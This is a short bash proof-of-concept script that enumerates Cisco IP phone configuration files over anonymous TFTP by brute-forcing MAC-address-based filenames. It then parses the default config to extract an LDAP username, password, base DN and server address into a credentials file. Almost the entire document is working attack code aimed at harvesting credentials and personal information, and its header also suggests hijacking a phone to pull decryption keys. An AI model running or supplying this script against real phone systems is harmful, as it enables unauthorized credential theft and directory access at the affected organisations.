#!/bin/bash
#######################################################################
# Proof of Concept on how to get tftp config files from cisco phones  #
# This can be performed anonymously and privileges gathered relies on #
# those assigned to the ldap account                                  #
# Developed by Daniel Svartman  (danielsvartman@gmail.com             #
# In case tftp files are encrypted, you will need to hijack a phone   #
# and download the decryption key from the ROM memory                 #
#######################################################################                              
 
# This example below is for enumerating and downloading configuration files from phones
# With this you can gather personal information and sometimes also credentials from LDAP
# The first 8 digits of the MAC address relies on cisco mac address used by phones
# While the last 4 are generated automatically
 
BASE_MAC=$1
TFTP_SERVER=$2
 
perl -e '$var = 0x0001; for (1 .. 65535 ) { printf qq[%04X\n], $var++ }' > mac.txt
 
#Now we should download the files
while read LINE; do
    tftp ${TFTP_SERVER} -c get SEP${BASE_MAC}${LINE}.cnf.xml
done < mac.txt
 
#Finally, we download and process also the SPDefault.cnf.xml file
tftp ${TFTP_SERVER} -c get SPDefault.cnf.xml
USERID=`grep "UseUserCredential"  SPDefault.cnf.xml | cut -d ">" -f 6 | cut -d "<" -f 1`
echo "USERID: " $USERID > credentials.txt
PWD=`grep "UseUserCredential" SPDefault.cnf.xml | cut -d ">" -f 8 | cut -d "<" -f 1`
echo "PWD: " $PWD >> credentials.txt
BASE_DN=`grep "UseUserCredential" SPDefault.cnf.xml | cut -d ">" -f 10 | cut -d "<" -f 1`
echo "BASE_DN: " $BASE_DN >> credentials.txt
while read LINE; do
            if [ "$LINE" = "<ProductType>Directory" ]; then
                read LINE
                ADDRESS=`echo $LINE | cut -d ">" -f 2 | cut -d "<" -f 1`
                echo "LDAP_IP_ADDRESS: " $ADDRESS >> credentials.txt
            fi
done < SPDefault.cnf.xml
 
echo "Done - Please, check credentials.txt file, also review all the SEPxxxx.cnf.xml files for further credentials"
